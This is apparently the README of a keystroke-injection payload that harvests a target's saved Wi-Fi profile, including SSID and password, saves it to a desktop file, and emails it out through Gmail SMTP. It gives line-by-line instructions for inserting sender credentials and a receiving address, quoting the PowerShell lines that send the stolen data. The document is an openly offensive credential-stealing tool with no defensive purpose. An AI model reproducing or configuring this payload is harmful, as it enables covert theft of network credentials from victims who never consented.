This payload Steals a targets Wifi profile. I.E. SSID, Passowrd and Authentication type.

Saves the profile to a text file named "Profile.txt" on the targets desktop.

Then sends the contents of Profile.txt (which contains the targets wifi profile) via a gmail to an email address of your choosing.

You must Edit the script to include a sender Gamils account creds as well as a recievers email address.

**Wifi Profile can only be sent via Gmail but can be received to any email.**  

You will need to edit the feilds for Senders and recievers email creditals.
For Senders Email go to line 101 or find this line <i><b> Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('CHANGE_THIS_GMAIL_ADDRESS@gmail.com', 'CHANGE_THIS_TO_EMAIL_PASSWORD')");</b></i>here you will need to change the text that says <i><b>CHANGE_THIS_GMAIL_ADDRESS@gmail.com<b/></i> to the gmail address the Wifi Profile is to be sent from.
Then Change the text that says <i><b>CHANGE_THIS_TO_EMAIL_PASSWORD</b></i> to the corresponding password of the email address from above.
IE: <i><b>Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('johndoe.techjuvi@gmail.com', 'Password1234')")</b></i> We will also need to specify a "from" email. Find this line of code <i><b>Keyboard.print("$ReportEmail.From = 'CHANGE_TO_GMAIL_ADDRESS'");</b></i> on line 109 and edit the text <i><b>CHANGE_TO_GMAIL_ADDRESS</b></i> to the same Gmail address from above (senders Gmail).

The final change you'll need to make is to specify a Revievers Email. The line of code looks like this <i><b>Keyboard.print("$ReportEmail.To.Add('CHANGE_TO_Recievers_Email_ADDRESS')");</b></i> and can be found on line 113.

Simply change the text that says <i><b>CHANGE_TO_Recievers_Email_ADDRESS</b></i> to the email address you want to recieve the Target's WIFI Profile .





